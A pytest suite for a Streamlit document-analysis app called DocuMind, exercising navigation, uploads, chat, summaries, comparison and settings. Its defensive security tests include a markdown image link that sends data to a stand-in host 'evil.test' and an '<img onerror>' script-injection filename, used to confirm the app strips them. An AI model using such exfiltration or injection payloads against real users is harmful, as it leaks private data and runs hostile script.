"""Drive the real Streamlit app: every page, the navigation and the main actions."""

from __future__ import annotations

from pathlib import Path

import pytest
import streamlit as st
from conftest import FakeLLM, HashingEmbedder
from streamlit.testing.v1 import AppTest

import config
from config import Paths, Settings, ensure_directories
from core.ingestion import DocumentIngestor
from core.ollama_client import OllamaStatus
from database.db_manager import DatabaseManager
from ui.components import quote, safe_markdown
from ui.library_page import filter_documents

APP = str(Path(__file__).parent.parent / "app.py")
REPORT = (
    b"The Riverside authority reached operating revenue of 148 million dollars in 2024. "
    b"The purpose of this report is to review water supply. Engineers recommend new sensors."
)
REVISED = REPORT.replace(b"148 million", b"152 million") + b" Crews replaced old pipes."
QUESTION = "The Riverside authority reached operating revenue of how many million dollars?"
NAV = ("dashboard", "documents", "summarize", "ask", "compare", "insights", "settings")


class FakeEngine(HashingEmbedder):
    def __init__(self, _config=None) -> None:
        super().__init__()

    is_loaded = False
    is_downloaded = True


class FakeClient(FakeLLM):
    def __init__(self, _config=None) -> None:
        super().__init__("Revenue was 148 million dollars [S1].")

    def status(self) -> OllamaStatus:
        return OllamaStatus(True, True, "9.9", ("fake:1b", "other:2b"))


@pytest.fixture
def app_settings(tmp_path, monkeypatch) -> Settings:
    settings = Settings(paths=Paths(data_dir=tmp_path / "data"))
    ensure_directories(settings.paths)
    monkeypatch.setattr(config, "settings", settings)
    monkeypatch.setattr("ui.settings_page.settings", settings)
    monkeypatch.setattr("core.embedding_engine.EmbeddingEngine", FakeEngine)
    monkeypatch.setattr("core.ollama_client.OllamaClient", FakeClient)
    st.cache_resource.clear()
    st.cache_data.clear()
    yield settings
    st.cache_resource.clear()
    st.cache_data.clear()


def start() -> AppTest:
    at = AppTest.from_file(APP, default_timeout=30).run()
    assert not at.exception
    return at


def go(at: AppTest, page: str) -> AppTest:
    at.button(key=f"nav_{page}").click().run()
    assert not at.exception, [e.value for e in at.exception]
    return at


def click(at: AppTest, label: str) -> AppTest:
    [button for button in at.button if button.label == label][0].click().run()
    assert not at.exception, [e.value for e in at.exception]
    return at


def upload(at: AppTest, *files: tuple[str, bytes]) -> AppTest:
    go(at, "documents")
    click(at, "Upload")
    at.file_uploader[0].set_value([(name, data, "text/plain") for name, data in files]).run()
    return click(at, "Process documents")


def text(at: AppTest) -> str:
    items = [*at.markdown, *at.caption, *at.warning]
    return " ".join(str(m.value) for m in items if not str(m.value).startswith("<style>"))


@pytest.mark.parametrize("page", NAV)
def test_every_page_opens_with_no_documents(app_settings, page) -> None:
    at = go(start(), page)
    assert at.button(key=f"nav_{page}").proto.type == "primary"


def test_only_the_current_page_is_highlighted(app_settings) -> None:
    at = go(start(), "insights")
    highlighted = [p for p in NAV if at.button(key=f"nav_{p}").proto.type == "primary"]
    assert highlighted == ["insights"]


def test_link_to_a_page_opens_it(app_settings) -> None:
    at = AppTest.from_file(APP, default_timeout=30)
    at.query_params["page"] = "settings"
    at.run()
    assert "Local AI" in text(at)


def test_unknown_page_link_opens_the_dashboard(app_settings) -> None:
    at = AppTest.from_file(APP, default_timeout=30)
    at.query_params["page"] = "nowhere"
    at.run()
    assert not at.exception and "Welcome to DocuMind" in text(at)


def test_app_makes_no_outside_requests_for_its_own_assets() -> None:
    root = Path(APP).parent
    assert (root / "assets" / "favicon.png").stat().st_size > 0
    assert 'page_icon=":' not in (root / "app.py").read_text(encoding="utf-8")
    assert "http" not in (root / "assets" / "styles.css").read_text(encoding="utf-8")
    assert "url(" not in (root / "assets" / "styles.css").read_text(encoding="utf-8")


def test_settings_explains_a_missing_ollama(app_settings, monkeypatch) -> None:
    monkeypatch.setattr(FakeClient, "status", lambda self: OllamaStatus(False, False))
    at = go(start(), "settings")
    assert "Ollama not installed" in text(at) and "ollama.com/download" in text(at)
    assert "Extractive mode" in text(at)


def test_dashboard_shows_real_totals_and_activity(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "dashboard")
    page = text(at)
    assert "report.txt" in page and "Uploaded report.txt" in page
    assert '<div class="dm-stat-value">1</div>' in page


def test_upload_reports_status_and_duplicates(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    assert "Ready" in text(at)
    at.file_uploader[0].set_value([("again.txt", REPORT, "text/plain")]).run()
    click(at, "Process documents")
    assert "Check" in text(at)


def test_library_open_and_two_step_delete(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "documents")
    assert "1 of 1 documents" in text(at)
    click(at, "Open")
    assert "Text preview" in text(at)
    click(at, "Back to My Documents")
    click(at, "Delete")
    assert "cannot be undone" in text(at)
    click(at, "Cancel")
    assert "1 of 1 documents" in text(at)
    click(at, "Delete")
    [b for b in at.button if b.label == "Delete" and b.key.startswith("yes_")][0].click().run()
    assert "No documents yet" in text(at)


def test_open_then_action_preselects_the_document(app_settings) -> None:
    at = start()
    upload(at, ("first.txt", REPORT), ("second.txt", REVISED))
    go(at, "documents")
    [b for b in at.button if b.label == "Open"][-1].click().run()
    opened = at.session_state["open_document"]
    click(at, "Summarize")
    assert at.selectbox(key="summary_document").value == opened
    assert at.session_state["page"] == "summarize"


def test_summary_is_labelled_and_saved_to_activity(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "summarize")
    assert "Extractive mode" in text(at)
    click(at, "Generate summary")
    assert "Extractive NLP" in text(at)
    assert len(at.get("download_button")) == 2
    go(at, "dashboard")
    assert "Summarized report.txt" in text(at)


def test_chat_answers_with_evidence_and_can_be_cleared(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "ask")
    assert "Try asking" in text(at)
    at.chat_input[0].set_value(QUESTION).run()
    assert not at.exception
    assert "Extractive NLP" in text(at) and "Try asking" not in text(at)
    click(at, "Clear chat")
    assert "Try asking" in text(at)


def test_chat_with_a_model_is_labelled_and_cites_a_source(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "settings")
    at.selectbox(key="settings_model").set_value("fake:1b").run()
    go(at, "ask")
    at.chat_input[0].set_value(QUESTION).run()
    page = text(at)
    assert "Local LLM: fake:1b" in page and "148 million dollars [S1]" in page
    assert "Extractive mode" not in page


def test_suggested_question_asks_it(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "ask")
    click(at, "What are the important findings?")
    assert any(m.name == "user" for m in at.chat_message)


def test_chat_history_survives_a_new_session(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "ask")
    at.chat_input[0].set_value(QUESTION).run()
    fresh = go(start(), "ask")
    assert any(m.name == "user" for m in fresh.chat_message)


def test_model_choice_is_saved_and_used(app_settings) -> None:
    at = start()
    go(at, "settings")
    at.selectbox(key="settings_model").set_value("other:2b").run()
    assert not at.exception
    fresh = go(start(), "settings")
    assert fresh.selectbox(key="settings_model").value == "other:2b"
    assert "other:2b" in text(fresh)


def test_compare_needs_two_documents_and_shows_results(app_settings) -> None:
    at = start()
    upload(at, ("a.txt", REPORT))
    go(at, "compare")
    assert "at least two documents" in text(at)
    upload(at, ("b.txt", REVISED))
    go(at, "compare")
    click(at, "Compare")
    assert "Overall similarity" in text(at) and "Different figures" in text(at)


def test_document_b_never_offers_document_a(app_settings) -> None:
    at = start()
    upload(at, ("a.txt", REPORT), ("b.txt", REVISED))
    go(at, "compare")
    labels = [box.label for box in at.selectbox]
    assert "Document A" in labels and "Document B" in labels
    a = next(box for box in at.selectbox if box.label == "Document A")
    b = next(box for box in at.selectbox if box.label == "Document B")
    assert a.value != b.value and len(b.options) == 1


def test_insights_page_shows_real_figures(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "insights")
    click(at, "Analyze document")
    assert "Reading time" in text(at) and len(at.get("download_button")) == 2


def test_clear_all_needs_the_word_and_removes_everything(app_settings) -> None:
    at = start()
    upload(at, ("report.txt", REPORT))
    go(at, "settings")
    clear = next(b for b in at.button if b.label == "Clear all application data")
    assert clear.disabled
    at.text_input(key="clear_confirmation").set_value("DELETE").run()
    click(at, "Clear all application data")
    db = DatabaseManager(app_settings.paths.database_path)
    assert db.list_documents() == [] and db.recent_activity(5) == []
    assert not list(app_settings.paths.uploads_dir.iterdir())


def test_deleting_a_document_removes_its_activity(db, test_settings) -> None:
    ingestor = DocumentIngestor(db, test_settings)
    document = ingestor.ingest("a.txt", REPORT).document
    db.log_activity("upload", "Uploaded a.txt", document.document_id)
    db.log_activity("other", "Kept")
    ingestor.delete(document.document_id)
    assert [item.summary for item in db.recent_activity(5)] == ["Kept"]


def test_settings_values_persist_and_update(db) -> None:
    assert db.get_setting("model") is None
    db.set_setting("model", "a")
    db.set_setting("model", "b")
    assert db.get_setting("model") == "b"


@pytest.mark.parametrize(
    "unsafe",
    [
        "![x](http://evil.test/?d=secret)",
        "[click](http://evil.test/)",
        "see http://evil.test/page",
        "[ref]: http://evil.test/",
    ],
)
def test_markdown_cannot_contact_another_server(unsafe) -> None:
    cleaned = safe_markdown(unsafe)
    assert "](" not in cleaned and "://evil" not in cleaned


def test_markdown_keeps_normal_formatting() -> None:
    assert safe_markdown("**Bold** [S1]\n- item") == "**Bold** [S1]\n- item"


def test_quoted_text_stays_inside_its_html_block(monkeypatch) -> None:
    captured = []
    monkeypatch.setattr("ui.components.st.markdown", lambda text, **_: captured.append(text))
    quote("First line.\n\n![x](http://evil.test/?d=secret)\r\n\r\nLast.", "file\n\nname")
    assert "\n" not in captured[0] and "\r" not in captured[0]
    assert "<br><br>" in captured[0]


def test_filenames_are_escaped_in_html(app_settings) -> None:
    at = start()
    upload(at, ("<img src=x onerror=alert(1)>.txt", REPORT))
    go(at, "documents")
    assert "<img src=x" not in " ".join(m.value for m in at.markdown if "dm-row-title" in m.value)


def test_library_search_filter_and_sort(db, test_settings) -> None:
    ingestor = DocumentIngestor(db, test_settings)
    ingestor.ingest("Beta.txt", REPORT)
    ingestor.ingest("alpha.txt", REVISED)
    documents = db.list_documents()
    names = [d.original_filename for d in filter_documents(documents, "", [], "Name")]
    assert names == ["alpha.txt", "Beta.txt"]
    assert [d.original_filename for d in filter_documents(documents, "BET", [], "Name")] == ["Beta.txt"]
    assert filter_documents(documents, "", ["PDF"], "Name") == []
